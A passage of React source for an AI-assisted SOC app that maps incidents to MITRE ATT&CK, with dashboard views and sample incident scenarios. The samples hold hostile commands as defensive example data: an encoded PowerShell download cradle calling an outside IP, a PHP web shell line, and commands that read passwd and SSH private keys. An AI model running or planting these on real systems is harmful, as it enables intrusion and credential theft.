          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">v0.1 · MITRE Mapper</div>
        </div>
      </div>
    </div>
    <nav className="flex-1 p-2">
      {NAV.map(n => {
        const Icon = n.icon;
        const active = view === n.id;
        const featured = n.featured;
        return (
          <button key={n.id} onClick={() => setView(n.id)}
            className={`w-full flex items-center gap-3 px-3 py-2 rounded-md text-sm font-medium mb-0.5 transition-colors ${
              active
                ? (featured
                    ? "bg-fuchsia-500/10 text-fuchsia-300 border border-fuchsia-500/20"
                    : "bg-cyan-500/10 text-cyan-300 border border-cyan-500/20")
                : (featured
                    ? "text-fuchsia-300/80 hover:text-fuchsia-200 hover:bg-fuchsia-500/5 border border-fuchsia-500/10"
                    : "text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/60 border border-transparent")
            }`}>
            <Icon size={16} />
            <span>{n.label}</span>
            {featured && !active && (
              <Sparkles size={11} className="ml-auto text-fuchsia-400/60" />
            )}
            {n.id === "history" && count > 0 && (
              <span className="ml-auto text-[10px] px-1.5 py-0.5 rounded bg-zinc-800 text-zinc-400">{count}</span>
            )}
          </button>
        );
      })}
    </nav>
    <div className="p-3 border-t border-zinc-800/80">
      <div className="text-[10px] text-zinc-600 uppercase tracking-widest mb-1">Engine</div>
      <div className="flex items-center gap-2">
        <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
        <div className="text-xs text-zinc-400">Baiman</div>
      </div>
      <div className="mt-1 text-[10px] text-zinc-600">Rule + RAG + LLM fusion</div>
    </div>
  </aside>
);

/* ----------------------------------------------------------------- */
/*  Dashboard                                                          */
/* ----------------------------------------------------------------- */
const KpiCard = ({ label, value, sub, icon: Icon, accent }) => (
  <Card className="p-4">
    <div className="flex items-start justify-between">
      <div>
        <div className="text-[10px] text-zinc-500 uppercase tracking-widest font-medium">{label}</div>
        <div className="mt-1 text-2xl font-semibold text-zinc-100 font-mono tabular-nums">{value}</div>
        {sub && <div className="mt-1 text-xs text-zinc-500">{sub}</div>}
      </div>
      <div className={`w-9 h-9 rounded-md flex items-center justify-center ${accent}`}>
        <Icon size={16} />
      </div>
    </div>
  </Card>
);

const MiniHeatmap = ({ coverage }) => {
  // coverage is map of techniqueId -> { count, maxSeverity }
  return (
    <div className="overflow-x-auto">
      <div className="grid gap-1.5" style={{ gridTemplateColumns: `repeat(${TACTICS.length}, minmax(72px, 1fr))` }}>
        {TACTICS.map(t => (
          <div key={t.id} className="text-[10px] text-zinc-500 uppercase tracking-wider font-medium truncate" title={t.name}>
            {t.name}
          </div>
        ))}
        {TACTICS.map(t => {
          const techs = TECHS_BY_TACTIC[t.id] || [];
          return (
            <div key={t.id} className="space-y-0.5">
              {techs.slice(0, 12).map(tech => {
                const c = coverage[tech.id];
                const cls = c ? sevBg(c.maxSeverity) : "bg-zinc-800/40 border-zinc-800";
                return (
                  <Tooltip key={tech.id} text={`${tech.id} ${tech.name}${c ? ` · ${c.count} hits · max sev ${c.maxSeverity}` : ""}`}>
                    <div className={`h-3 rounded-sm border ${cls}`} />
                  </Tooltip>
                );
              })}
            </div>
          );
        })}
      </div>
    </div>
  );
};

const Dashboard = ({ analyses, gotoAnalyze, openAnalysis, loadSample }) => {
  const stats = useMemo(() => {
    const total = analyses.length;
    const critical = analyses.filter(a => (a.severity || 0) >= 75).length;
    const techniqueSet = new Set();
    const techCounts = {};
    const tacticCoverage = new Set();
    const coverage = {};
    let sevSum = 0, sevCount = 0;

    analyses.forEach(a => {
      (a.mappings || []).forEach(m => {
        techniqueSet.add(m.technique_id);
        techCounts[m.technique_id] = (techCounts[m.technique_id] || 0) + 1;
        if (m.tactic_id) tacticCoverage.add(m.tactic_id);
        const sev = m.severity || a.severity || 0;
        if (!coverage[m.technique_id] || coverage[m.technique_id].maxSeverity < sev) {
          coverage[m.technique_id] = { count: (coverage[m.technique_id]?.count || 0) + 1, maxSeverity: sev };
        } else {
          coverage[m.technique_id].count += 1;
        }
      });
      if (a.severity != null) { sevSum += a.severity; sevCount += 1; }
    });

    const topTech = Object.entries(techCounts)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 8)
      .map(([id, count]) => ({ id, count, name: TECH_BY_ID[id]?.name || id }));

    return {
      total, critical,
      uniqueTechniques: techniqueSet.size,
      tacticCoverage: tacticCoverage.size,
      avgSeverity: sevCount ? Math.round(sevSum / sevCount) : 0,
      coverage, topTech,
    };
  }, [analyses]);

  const recent = analyses.slice(0, 6);

  return (
    <div className="space-y-5">
      <div className="flex items-end justify-between">
        <div>
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Overview</div>
          <h1 className="text-2xl font-semibold text-zinc-100">SOC Operations Dashboard</h1>
        </div>
        <Button variant="primary" icon={Plus} onClick={gotoAnalyze}>New Analysis</Button>
      </div>

      <div className="grid grid-cols-4 gap-3">
        <KpiCard label="Total Analyses" value={stats.total} icon={Activity} accent="bg-cyan-500/10 text-cyan-400" />
        <KpiCard label="Critical / High" value={stats.critical} sub={stats.total ? `${Math.round(stats.critical/stats.total*100)}% of all` : ""} icon={AlertTriangle} accent="bg-red-500/10 text-red-400" />
        <KpiCard label="Unique Techniques" value={stats.uniqueTechniques} sub={`${stats.tacticCoverage}/14 tactics`} icon={Target} accent="bg-fuchsia-500/10 text-fuchsia-400" />
        <KpiCard label="Avg Severity" value={stats.avgSeverity} sub={stats.avgSeverity ? sevLabel(stats.avgSeverity) : ""} icon={BarChart3} accent="bg-orange-500/10 text-orange-400" />
      </div>

      <Card className="p-4">
        <div className="flex items-center justify-between mb-3">
          <div>
            <div className="text-sm font-semibold text-zinc-100">ATT&CK Coverage Heatmap</div>
            <div className="text-xs text-zinc-500">Coverage across {analyses.length} analyses. Each column is a tactic; rows are techniques.</div>
          </div>
          <div className="flex items-center gap-2 text-[10px] text-zinc-500">
            <span>Low</span>
            <div className="flex gap-0.5">
              <div className="w-3 h-3 rounded-sm bg-emerald-500/30 border border-emerald-500/50" />
              <div className="w-3 h-3 rounded-sm bg-amber-500/30 border border-amber-500/50" />
              <div className="w-3 h-3 rounded-sm bg-orange-500/30 border border-orange-500/50" />
              <div className="w-3 h-3 rounded-sm bg-red-500/30 border border-red-500/50" />
              <div className="w-3 h-3 rounded-sm bg-fuchsia-500/30 border border-fuchsia-500/50" />
            </div>
            <span>Critical</span>
          </div>
        </div>
        <MiniHeatmap coverage={stats.coverage} />
      </Card>

      <div className="grid grid-cols-3 gap-4">
        <Card className="col-span-2 p-4">
          <div className="flex items-center justify-between mb-3">
            <div className="text-sm font-semibold text-zinc-100">
              {recent.length === 0 ? "Start with a sample" : "Recent Analyses"}
            </div>
            {recent.length === 0 && (
              <div className="text-[10px] uppercase tracking-widest text-zinc-500">No history yet · pick one below</div>
            )}
          </div>
          {recent.length === 0 ? (
            <div className="grid grid-cols-2 gap-2">
              {QUICK_SAMPLES.map(s => {
                const Icon = s.icon;
                return (
                  <button key={s.id} onClick={() => loadSample(s)}
                    className={`text-left p-3 rounded-md border bg-zinc-900/40 hover:bg-zinc-800/60 hover:border-zinc-700 transition-all group`}>
                    <div className="flex items-center gap-2 mb-1.5">
                      <div className={`w-7 h-7 rounded-md border flex items-center justify-center ${s.accent}`}>
                        <Icon size={14} />
                      </div>
                      <div className="text-sm font-medium text-zinc-100">{s.title}</div>
                      <PlayCircle size={12} className="ml-auto text-zinc-600 group-hover:text-cyan-400 transition-colors" />
                    </div>
                    <div className="text-xs text-zinc-500 leading-snug">{s.description}</div>
                  </button>
                );
              })}
            </div>
          ) : (
            <div className="space-y-1.5">
              {recent.map(a => (
                <button key={a.id} onClick={() => openAnalysis(a.id)}
                  className="w-full flex items-center gap-3 p-2.5 rounded-md hover:bg-zinc-800/60 transition-colors text-left border border-transparent hover:border-zinc-700">
                  <div className={`w-2 h-2 rounded-full ${sevDot(a.severity)}`} />
                  <div className="flex-1 min-w-0">
                    <div className="text-sm text-zinc-200 truncate flex items-center gap-2">
                      {a.title || "Untitled analysis"}
                      {a.status && a.status !== "open" && (
                        <span className="text-[9px] uppercase tracking-widest text-zinc-500 px-1.5 py-0.5 rounded bg-zinc-800">{a.status}</span>
                      )}
                    </div>
                    <div className="text-xs text-zinc-500 flex items-center gap-1.5">
                      <span>{new Date(a.created_at).toLocaleString()} · {a.input_type}</span>
                      {a.tags?.length > 0 && (
                        <>
                          <span>·</span>
                          <span className="text-violet-400">{a.tags.slice(0, 2).map(t => `#${t}`).join(" ")}</span>
                        </>
                      )}
                    </div>
                  </div>
                  <div className={`text-xs font-mono tabular-nums ${sevColor(a.severity)}`}>{a.severity ?? "—"}</div>
                  <ChevronRight size={14} className="text-zinc-600" />
                </button>
              ))}
            </div>
          )}
        </Card>

        <Card className="p-4">
          <div className="text-sm font-semibold text-zinc-100 mb-3">Top Techniques</div>
          {stats.topTech.length === 0 ? (
            <div className="text-xs text-zinc-500 text-center py-6">No data yet.</div>
          ) : (
            <div className="space-y-2">
              {stats.topTech.map((t, i) => {
                const max = stats.topTech[0].count;
                return (
                  <div key={t.id}>
                    <div className="flex items-center justify-between text-xs mb-1">
                      <span className="font-mono text-cyan-400">{t.id}</span>
                      <span className="text-zinc-500">{t.count}×</span>
                    </div>
                    <div className="text-[11px] text-zinc-400 truncate mb-1">{t.name}</div>
                    <div className="h-1 rounded-full bg-zinc-800 overflow-hidden">
                      <div className="h-full bg-gradient-to-r from-cyan-500 to-fuchsia-500" style={{ width: `${(t.count/max)*100}%` }} />
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </Card>
      </div>
    </div>
  );
};

/* ----------------------------------------------------------------- */
/*  Analyze view (real LLM call)                                       */
/* ----------------------------------------------------------------- */
/* ----------------------------------------------------------------- */
/*  Quick-start samples — realistic scenarios analysts can run with   */
/*  one click. Each maps to a real input mode.                         */
/* ----------------------------------------------------------------- */
const QUICK_SAMPLES = [
  {
    id: "phishing_ransomware",
    title: "Phishing → Ransomware",
    description: "Spearphishing attachment leading to encrypted files. Classic small-business ransomware chain.",
    mode: "nl_incident",
    severity_hint: 95,
    icon: Skull,
    accent: "text-fuchsia-400 bg-fuchsia-500/10 border-fuchsia-500/30",
    content: `On 2026-05-20 at 09:14 UTC, finance employee Jane Doe (jdoe@acme.local) on host WIN-FIN-04 received an email impersonating HR with subject "Updated tax withholding form - action required". The attachment was a Word document named tax-update-Q2.docm. She opened it and clicked Enable Content when prompted.

Approximately 30 seconds later, winword.exe spawned a powershell.exe process with the command line: powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIA... (~850 chars of base64). The decoded payload downloaded a second-stage binary from hxxp://185.220.101.45/update.bin to C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost.exe.

Within 5 minutes, the process accessed lsass.exe memory (handle request from svchost.exe with PROCESS_VM_READ). Shortly after, the same host initiated SMB connections to three other workstations (WIN-FIN-02, WIN-FIN-07, WIN-HR-01) using credentials harvested from LSASS. On those hosts, files in user profile directories began appearing with the .lockd extension and a file named READ_ME_NOW.txt appeared on each desktop demanding 8 BTC.

Windows Defender was disabled approximately 1 minute before encryption began. Event logs were cleared at the same time.`
  },
  {
    id: "kerberoasting",
    title: "Kerberoasting",
    description: "Service account ticket harvesting against Active Directory.",
    mode: "nl_incident",
    severity_hint: 75,
    icon: Target,
    accent: "text-amber-400 bg-amber-500/10 border-amber-500/30",
    content: `At 03:22 UTC, host WIN-DEV-12 (user: svc-build) initiated a series of Kerberos TGS requests against the domain controller DC-CORP-01 for service principal names tied to multiple privileged service accounts including svc-sql, svc-backup, and svc-adm.

Windows Event ID 4769 fired 17 times in 90 seconds, all from the same source, all requesting RC4-HMAC encryption (Ticket Encryption Type 0x17) — anomalous because the environment standardized on AES years ago.

The svc-build account is not normally interactive and these requests fell well outside business hours. No corresponding application activity was observed on WIN-DEV-12 that would have legitimately required these service tickets.`
  },
  {
    id: "sysmon_powershell",
    title: "Encoded PowerShell (Sysmon)",
    description: "Raw Sysmon log showing obfuscated PowerShell execution from Office.",
    mode: "raw_logs",
    severity_hint: 80,
    icon: Terminal,
    accent: "text-cyan-400 bg-cyan-500/10 border-cyan-500/30",
    content: `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime='2026-05-22T14:21:09.342Z'/>
    <EventRecordID>87234</EventRecordID>
    <Correlation/>
    <Execution ProcessID='2456' ThreadID='3892'/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-FIN-04.acme.local</Computer>
    <Security UserID='S-1-5-18'/>
  </System>
  <EventData>
    <Data Name='RuleName'>SuspiciousChild</Data>
    <Data Name='UtcTime'>2026-05-22 14:21:09.342</Data>
    <Data Name='ProcessGuid'>{a4b8e0e1-12cd-6638-d501-000000001a00}</Data>
    <Data Name='ProcessId'>4892</Data>
    <Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name='FileVersion'>10.0.19041.1</Data>
    <Data Name='Description'>Windows PowerShell</Data>
    <Data Name='CommandLine'>powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAcwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUALwBwAGEAeQBsAG8AYQBkACcAKQA=</Data>
    <Data Name='CurrentDirectory'>C:\\Users\\jdoe\\Documents\\</Data>
    <Data Name='User'>ACME\\jdoe</Data>
    <Data Name='LogonGuid'>{a4b8e0e1-0fa1-6638-9c0a-040000000000}</Data>
    <Data Name='ParentProcessGuid'>{a4b8e0e1-12c0-6638-c801-000000001a00}</Data>
    <Data Name='ParentProcessId'>3712</Data>
    <Data Name='ParentImage'>C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
    <Data Name='ParentCommandLine'>"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\jdoe\\Downloads\\tax-update-Q2.docm"</Data>
  </EventData>
</Event>`
  },
  {
    id: "aws_privesc",
    title: "AWS Console Compromise",
    description: "Suspicious IAM activity from an unrecognized source location.",
    mode: "nl_incident",
    severity_hint: 88,
    icon: Globe,
    accent: "text-emerald-400 bg-emerald-500/10 border-emerald-500/30",
    content: `Between 02:11 and 02:47 UTC, the AWS IAM user "backup-svc" (normally an automation account that only runs from EC2 instance i-0a8b8c7d6e) authenticated to the AWS Console from source IP 91.234.45.12 (geolocation: Bucharest, Romania) using a valid access key.

Within 4 minutes the session: (1) created a new IAM user named "system-update" with AdministratorAccess attached directly, (2) generated a new access key pair for that user, (3) called AssumeRole against the prod-data-readonly role and listed all S3 buckets in the organization, (4) initiated a download of approximately 12 GB from the s3://acme-prod-customer-pii bucket to an unknown external endpoint via s3:GetObject calls with byte-range headers indicating chunked exfiltration.

CloudTrail shows the original access key (AKIA...EXAMPLE) was last rotated 14 months ago, no IP allowlist was in place, and MFA was not enforced for this user.`
  },
  {
    id: "linux_webshell",
    title: "Linux Web Shell",
    description: "Apache hosting a PHP web shell; lateral movement attempts via SSH.",
    mode: "nl_incident",
    severity_hint: 82,
    icon: FileCode,
    accent: "text-orange-400 bg-orange-500/10 border-orange-500/30",
    content: `Web server host srv-www-03 (Ubuntu 22.04, Apache 2.4.52) was found hosting a PHP file at /var/www/html/uploads/sys.php with the following content pattern: <?php system($_GET['cmd']); ?>. The file was uploaded via the application's image-upload endpoint on 2026-05-19, which performs no file-extension validation.

Apache access logs show GET requests to /uploads/sys.php?cmd=... originating from 45.142.x.x over the next 72 hours executing commands including: id; uname -a; cat /etc/passwd; netstat -an; find / -name "*.conf" -path "*ssh*"; cat /home/*/.ssh/id_rsa.

Subsequent auth.log entries show SSH login attempts from srv-www-03 to internal hosts srv-db-01 and srv-app-02 using a private key matching the harvested id_rsa file from user appuser. Two of these attempts succeeded against srv-db-01.

On srv-db-01, mysqldump was invoked twice from a shell session under appuser, exporting the "customers" and "transactions" databases to /tmp/data.sql.gz, followed by an outbound HTTPS connection to a known threat actor C2 domain ending in .top.`
  },
  {
    id: "valid_account_anomaly",
    title: "Insider / Account Compromise",
    description: "Off-hours access from an unusual location with data staging signs.",
    mode: "nl_incident",
    severity_hint: 68,
    icon: Skull,
    accent: "text-violet-400 bg-violet-500/10 border-violet-500/30",
    content: `User account john.smith@acme.com — a sales rep based in Chicago who normally works 09:00-17:00 CST — successfully signed into Microsoft 365 from IP 103.214.x.x (geolocation: Singapore) at 02:33 UTC on a Saturday. MFA was satisfied via an SMS code.

Within 20 minutes the session: (1) created a new inbox rule forwarding all messages containing "invoice" or "wire" to an external Proton Mail address, (2) ran 14 separate searches in OneDrive for terms like "password", "credentials", "banking", "M&A", (3) downloaded 47 files to the session including 3 spreadsheets named with the prefix "Q2_acquisition_targets".

The same user account had a successful login from Chicago 6 hours earlier. No travel was indicated in the corporate calendar or expense system. The user does not have a known business reason to access M&A folders.`
  },
];

const INPUT_MODES = [
  { id: "nl_incident",      label: "Natural Language",  icon: MessageSquare, hint: "Describe what happened in your own words — we'll ask follow-up questions if needed",
    placeholder: `Describe what happened in plain English — no security jargon needed.

Examples:
• "My computer started acting weird after I opened an email attachment yesterday. Now there's a strange program in my taskbar and files have a new extension."
• "Someone logged into my work account at 3am from an IP I don't recognize, and there are new email forwarding rules I didn't set up."
• "A coworker clicked a link in a fake invoice email. Their browser opened a Word document that asked to enable macros."

If you're not sure what details matter, just describe what you saw — we'll ask for more if we need it.` },
  { id: "raw_logs",         label: "Raw Logs",          icon: Terminal,     hint: "Paste logs in any format (Sysmon, Windows Event, Linux auth, JSON, etc.)",
    placeholder: `Paste raw log lines here. Sysmon, Windows Event XML/JSON, Linux auth.log, firewall syslog, cloud audit JSON — the analyzer auto-detects format.

Example (Sysmon EID 1):
<Event><EventID>1</EventID><Image>powershell.exe</Image><CommandLine>powershell -nop -w hidden -enc JABzAD0A...</CommandLine><ParentImage>WINWORD.EXE</ParentImage></Event>` },
  { id: "attack_name",      label: "Attack Name",       icon: Skull,        hint: "Name a known attack technique or campaign",
    placeholder: "e.g. Kerberoasting, Pass-the-Hash, Golden Ticket, DCSync, OAuth Consent Phishing, BPFDoor, AS-REP Roasting" },
  { id: "ioc",              label: "IOCs",              icon: Hash,         hint: "Paste IPs, domains, hashes, URLs, filenames",
    placeholder: `Mix and match — IPs, domains, hashes, URLs, filenames, registry paths. One per line or comma-separated.

185.220.101.45
evil-domain.tk
44d88612fea8a8f36de82e1278abb02f
hxxps://malicious[.]example/payload.exe
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater` },
  { id: "event_id",         label: "Event ID",          icon: FileText,     hint: "Windows / Sysmon event IDs and what they imply",
    placeholder: "Examples:\nSysmon EID 1, 3, 7, 10, 11, 13, 22\nWindows Security 4624, 4625, 4672, 4688, 4697, 4720, 4768, 4769, 7045" },
  { id: "detection_rule",   label: "Detection Rule",    icon: FileCode,     hint: "Paste Sigma / Splunk SPL / KQL / YARA / Suricata",
    placeholder: `Paste a detection rule and we'll map what it detects.

title: Suspicious Encoded PowerShell
logsource: { product: windows, category: process_creation }
detection:
  selection:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains: ' -enc '
  condition: selection
level: high` },
];

/* ----------------------------------------------------------------- */
/*  Refine View — paste rough text, get a clean structured version    */
/* ----------------------------------------------------------------- */
const REFINE_EXAMPLES = [
  {
    label: "Interview scenario",
    text: `Imagine someone in finance gets an email looking like it's from HR saying they need to update their tax info. They click the link and download a Word doc. They open it and enable macros because the doc says to. Then their files start getting encrypted and they see a ransom note on the desktop. We notice the same employee's machine started reaching out to a weird IP we haven't seen before, like 91.234.x.x, and another machine on the network got accessed using the employee's credentials. The attackers also seem to have disabled Windows Defender and cleared event logs.`
  },
  {
    label: "Panicked user report",
    text: `ok so this is bad - my colleague jane clicked something in an email yesterday afternoon i think around 3pm? she said her screen flashed and then nothing happened. but this morning IT said her account was logging in from like 4 different countries overnight and there are emails in her sent folder going to people we dont know with attachments. some of the finance team also got those emails apparently. her laptop is running really slow and theres a process called svhost.exe (with the typo!) in task manager that wont close`
  },
  {
    label: "Bullet notes",
    text: `- alert from edr: powershell.exe spawned by winword.exe
- 03:14 UTC, host DC-FIN-02
- cmdline had base64 blob, ~800 chars
- 30s later: net.exe and whoami.exe ran
- 2 mins later: ldap query from same host enumerating domain admins
- outbound tls connection to 45.142.x.x port 443, no jarm match in our intel
- user was vp finance, was traveling
- mfa not triggered for the session`
  },
];

const RefineView = ({ onSendToAnalyze }) => {
  const [rawText, setRawText] = useState("");
  const [refined, setRefined] = useState(null);
  const [running, setRunning] = useState(false);
  const [error, setError] = useState(null);
  const [retryInfo, setRetryInfo] = useState(null);
  const abortRef = useRef(null);

  useEffect(() => {
    if (!retryInfo) return;
    const startedAt = Date.now();
    const id = setInterval(() => {
      const elapsed = Date.now() - startedAt;
      const remaining = Math.max(0, retryInfo.delayMs - elapsed);
      setRetryInfo(r => r ? { ...r, countdown: remaining } : r);
      if (remaining <= 0) clearInterval(id);
    }, 100);
    return () => clearInterval(id);
  }, [retryInfo?.attempt, retryInfo?.delayMs]);

  const cancel = () => { abortRef.current?.abort(); abortRef.current = null; setRunning(false); setRetryInfo(null); };

  const refine = async () => {
    setError(null); setRetryInfo(null); setRefined(null);
    if (!rawText.trim()) { setError("Add some text to refine first."); return; }
    setRunning(true);
    const controller = new AbortController();
    abortRef.current = controller;
    try {
      const out = await refineInput(rawText, {
        signal: controller.signal,
        onRetry: info => setRetryInfo({ ...info, countdown: info.delayMs }),
      });
      setRefined(out);
      setRetryInfo(null);
    } catch (e) {
      if (e.message !== "Cancelled") setError(e.message || "Refinement failed");
    } finally {
      setRunning(false);
      abortRef.current = null;
    }
  };

  const sendToAnalyze = () => {
    if (!refined) return;
    // Build the final text we hand off: refined_text + the extracted block as additional context
    const lines = [refined.refined_text];
    const ex = refined.extracted || {};
    const blocks = [];
    Object.entries(ex).forEach(([k, v]) => {
      if (Array.isArray(v) && v.length > 0) blocks.push(`${k.replace(/_/g, " ")}: ${v.join("; ")}`);
    });
    if (blocks.length > 0) lines.push("\nKey indicators:\n" + blocks.map(b => "- " + b).join("\n"));
    if (refined.gaps?.length > 0) lines.push("\nKnown gaps:\n" + refined.gaps.map(g => "- " + g).join("\n"));
    const finalText = lines.join("\n");
    onSendToAnalyze({
      content: finalText,
      mode: "nl_incident",
      title: refined.suggested_title || "",
    });
  };

  const SectionList = ({ label, items, icon: Icon, accent }) => {
    if (!items || items.length === 0) return null;
    return (
      <div>
        <div className="flex items-center gap-2 mb-1.5">
          <Icon size={12} className={accent} />
          <div className="text-[10px] uppercase tracking-widest text-zinc-500 font-medium">{label}</div>
          <div className="text-[10px] text-zinc-600">· {items.length}</div>
        </div>
        <div className="flex flex-wrap gap-1.5">
          {items.map((v, i) => (
            <span key={i} className="text-[11px] font-mono px-2 py-0.5 rounded bg-zinc-800/60 border border-zinc-700 text-zinc-300">
              {v}
            </span>
          ))}
        </div>
      </div>
    );
  };

  return (
    <div className="space-y-4 max-w-7xl">
      <div className="flex items-end justify-between">
        <div>
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Pre-process</div>
          <h1 className="text-2xl font-semibold text-zinc-100 flex items-center gap-2">
            Refine Input
            <Pill className="border-fuchsia-500/30 text-fuchsia-300 bg-fuchsia-500/10">AI-assisted</Pill>
          </h1>
          <div className="text-sm text-zinc-500 mt-1 max-w-3xl">
            Paste rough notes, panicked user reports, interview scenarios, or messy bullet points. The Refiner extracts indicators, structures the timeline, and hands a clean analyst-grade description to the analyzer.
          </div>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-4">
        {/* LEFT: rough input */}
        <Card className="p-4 flex flex-col">
          <div className="flex items-center justify-between mb-2">
            <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Rough Input</div>
            <div className="flex items-center gap-1">
              {REFINE_EXAMPLES.map((ex, i) => (
                <button key={i} onClick={() => setRawText(ex.text)} disabled={running}
                  className="text-[10px] px-2 py-1 rounded bg-zinc-800/60 border border-zinc-700 text-zinc-400 hover:bg-fuchsia-500/10 hover:border-fuchsia-500/40 hover:text-fuchsia-200 transition-colors disabled:opacity-40">
                  {ex.label}
                </button>
              ))}
            </div>
          </div>
          <textarea
            value={rawText}
            onChange={e => setRawText(e.target.value)}
            disabled={running}
            placeholder={`Paste anything — interview scenarios, free notes, chat logs, broken English, half-finished bullet points. Don't worry about structure or jargon.

Example: "guy in accounting clicked some email yesterday, screen flashed, now his computer is slow and IT says weird logins from europe overnight, also some files have weird extensions on his desktop..."`}
            className="flex-1 w-full bg-zinc-950 border border-zinc-800 rounded-md px-3 py-2.5 text-sm text-zinc-100 placeholder-zinc-600 focus:border-fuchsia-500/50 focus:outline-none"
            style={{ minHeight: 360, lineHeight: 1.55 }}
          />
          <div className="mt-3 flex items-center justify-between">
            <div className="text-xs text-zinc-500">{rawText.length} chars</div>
            <div className="flex items-center gap-2">
              {!running && <Button variant="ghost" onClick={() => { setRawText(""); setRefined(null); setError(null); }} disabled={!rawText}>Clear</Button>}
              {running ? (
                <Button variant="danger" icon={X} onClick={cancel}>Cancel</Button>
              ) : (
                <Button variant="primary" icon={Sparkles} onClick={refine} disabled={!rawText.trim()}>
                  Refine
                </Button>
              )}
            </div>
          </div>
        </Card>

        {/* RIGHT: refined output */}
        <Card className="p-4 flex flex-col">
          <div className="flex items-center justify-between mb-2">
            <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Refined Output</div>
            {refined && (
              <div className="flex items-center gap-2">
                <CopyBtn text={refined.refined_text} />
                <Button variant="primary" icon={ChevronRight} onClick={sendToAnalyze}>
                  Send to Analyze
                </Button>
              </div>
            )}
          </div>

          {!refined && !running && !error && (
            <div className="flex-1 flex flex-col items-center justify-center text-center py-12">
              <div className="w-12 h-12 rounded-full bg-fuchsia-500/10 border border-fuchsia-500/30 flex items-center justify-center mb-3">
                <Sparkles size={20} className="text-fuchsia-300" />
              </div>
              <div className="text-sm text-zinc-300 font-medium">Your refined incident will appear here</div>
              <div className="text-xs text-zinc-500 mt-1 max-w-md">
                The Refiner extracts hosts, users, processes, files, network indicators, observed behaviors, and known gaps — then formats everything as a clean analyst description.
              </div>
            </div>
          )}

          {running && !refined && (
            <div className="flex-1 flex items-center justify-center py-12 text-zinc-400">
              <Spinner size={20} />
              <span className="ml-3 text-sm">Refining your description…</span>
            </div>
          )}

          {refined && (
            <div className="flex-1 overflow-y-auto space-y-4 pr-1">
              {refined._truncated && (
                <div className="p-2 rounded bg-amber-500/10 border border-amber-500/30 text-[11px] text-amber-200">
                  Output was truncated. Consider shortening the input.
                </div>
              )}

              {refined.suggested_title && (
                <div>
                  <div className="text-[10px] uppercase tracking-widest text-zinc-500 mb-1">Suggested title</div>
                  <div className="text-sm text-zinc-200 font-medium">{refined.suggested_title}</div>
                </div>
              )}

              <div>
                <div className="text-[10px] uppercase tracking-widest text-zinc-500 mb-1">Refined narrative</div>
                <div className="text-sm text-zinc-100 leading-relaxed whitespace-pre-wrap bg-zinc-950/60 border border-zinc-800 rounded-md p-3">
                  {refined.refined_text}
                </div>
              </div>

              {refined.extracted && (
                <div>
                  <div className="text-[10px] uppercase tracking-widest text-zinc-500 mb-2">Extracted indicators</div>
                  <div className="grid grid-cols-1 gap-3 bg-zinc-950/40 border border-zinc-800 rounded-md p-3">
                    <SectionList label="Timestamps" items={refined.extracted.timestamps} icon={Clock} accent="text-cyan-400" />
                    <SectionList label="Hosts / Systems" items={refined.extracted.hosts_or_systems} icon={Database} accent="text-emerald-400" />
                    <SectionList label="Users / Accounts" items={refined.extracted.users_or_accounts} icon={Target} accent="text-violet-400" />
                    <SectionList label="Processes / Programs" items={refined.extracted.processes_or_programs} icon={Terminal} accent="text-amber-400" />
                    <SectionList label="Files" items={refined.extracted.files} icon={FileText} accent="text-orange-400" />
                    <SectionList label="Network" items={refined.extracted.network} icon={Globe} accent="text-cyan-400" />
                    <SectionList label="Observed Behaviors" items={refined.extracted.observed_behaviors} icon={Eye} accent="text-fuchsia-400" />
                    <SectionList label="Actions Taken" items={refined.extracted.actions_taken} icon={Crosshair} accent="text-red-400" />
                  </div>
                </div>
              )}

              {refined.gaps?.length > 0 && (
                <div>
                  <div className="text-[10px] uppercase tracking-widest text-zinc-500 mb-1">Known gaps</div>
                  <ul className="space-y-1">
                    {refined.gaps.map((g, i) => (
                      <li key={i} className="text-xs text-amber-300/90 flex items-start gap-2">
                        <AlertTriangle size={11} className="text-amber-400 flex-shrink-0 mt-0.5" />
                        <span>{g}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              )}

              {refined.confidence_in_refinement != null && (
                <div className="flex items-center justify-between text-[11px] text-zinc-500 pt-1 border-t border-zinc-800/60">
                  <span>Refiner confidence</span>
                  <span className="font-mono text-zinc-400">{Math.round(refined.confidence_in_refinement * 100)}%</span>
                </div>
              )}
            </div>
          )}
        </Card>
      </div>

      {retryInfo && (
        <Card className="p-4 border-amber-500/40 bg-amber-500/5">
          <div className="flex items-start gap-3">
            <RefreshCw size={18} className="text-amber-400 flex-shrink-0 mt-0.5 animate-spin" />
            <div className="flex-1">
              <div className="text-sm font-medium text-amber-200">
                Anthropic API is busy — retrying ({retryInfo.attempt}/{retryInfo.maxRetries})
